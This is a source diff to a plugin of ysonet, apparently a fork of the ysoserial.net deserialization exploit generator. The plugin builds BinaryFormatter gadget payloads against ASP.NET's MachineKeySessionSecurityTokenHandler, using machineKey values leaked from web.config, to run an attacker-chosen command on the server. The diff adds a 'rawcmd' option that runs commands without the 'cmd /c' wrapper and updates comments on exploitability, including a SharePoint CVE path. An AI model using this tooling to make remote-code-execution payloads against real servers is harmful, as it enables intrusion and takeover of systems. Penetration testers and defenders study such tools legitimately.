@@ -11,11 +11,14 @@ using ysonet.Helpers;
  * 
   * Comments: 
  *  This plugin is based on the existing SessionSecurityTokenHandler plugin.
- *  See `MachineKeySessionSecurityTokenHandler`: https://learn.microsoft.com/zh-cn/dotnet/api/system.identitymodel.services.tokens.machinekeysessionsecuritytokenhandler?view=netframework-4.8.1 
- *  This PoC uses BinaryFormatter from TypeConfuseDelegate
+ *  See `MachineKeySessionSecurityTokenHandler`: https://learn.microsoft.com/zh-cn/dotnet/api/system.identitymodel.services.tokens.machinekeysessionsecuritytokenhandler?view=netframework-4.8.1
+ *  This PoC uses BinaryFormatter from TextFormattingRunProperties.
+ *  It models the named MachineKeySessionSecurityTokenHandler transform chain: Deflate followed by the handler's MachineKey transform (MachineKeyDataProtector.Protect).
  *  The YSoNet tool includes an exploit plugin for the SessionSecurityTokenHandler security issue. However, due to the fact that SessionSecurityTokenHandler employs DPAPI for encryption and decryption, it is often difficult to exploit in most cases.
  *  Nevertheless, Microsoft's documentation on SessionSecurityTokenHandler mentions that for web scenarios requiring a similar security mechanism, one can use the MachineKeySessionSecurityTokenHandler.
  *  This class inherits from SessionSecurityTokenHandler and shares similar characteristics. The key difference is that MachineKeySessionSecurityTokenHandler utilizes MachineKey configuration information for encryption and decryption operations.
+ *  MachineKey material is required here because this named handler applies its MachineKey transform. That requirement belongs to this handler, not to every SessionSecurityToken deserialization sink.
+ *  The SharePoint CVE-2026-50522 custom-handler case is a distinct deflate-only path that needs no MachineKey secret; it lives in SharePointPlugin.
  *  Therefore, as long as the MachineKey configuration information can be obtained (for instance, through a web.config leak), it may be possible to exploit it, making it more susceptible to exploitation compared to SessionSecurityTokenHandler.
  *  This PoC produces an error and may crash the application
 **/
@@ -28,6 +31,7 @@ namespace ysonet.Plugins
         static bool test = false;
         static bool minify = false;
         static bool useSimpleType = true;
+        static bool rawcmd = false;
         static string validationKey = "";
         static string decryptionKey = "";
         static string validationAlg = "HMACSHA1";
@@ -40,6 +44,7 @@ namespace ysonet.Plugins
                 {"t|test", "In this scenario, the test mode should not be applied, as the sink point relies on the web environment. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
+                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                 {"vk|validationkey=", "Enter the validationKey from the web.config", v => validationKey = v },
                 {"ek|decryptionkey=", "Enter the decryptionKey from the web.config", v => decryptionKey = v },
                 {"va|validationalg=", "Enter the validation from the web.config. Default: HMACSHA1. e.g: HMACSHA1/HMACSHA256/HMACSHA384/HMACSHA512", v => validationAlg = v },
@@ -76,6 +81,7 @@ namespace ysonet.Plugins
                 inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.IsRawCmd = rawcmd;
                 inputArgs.Test = test;
             }
             catch (OptionException e)
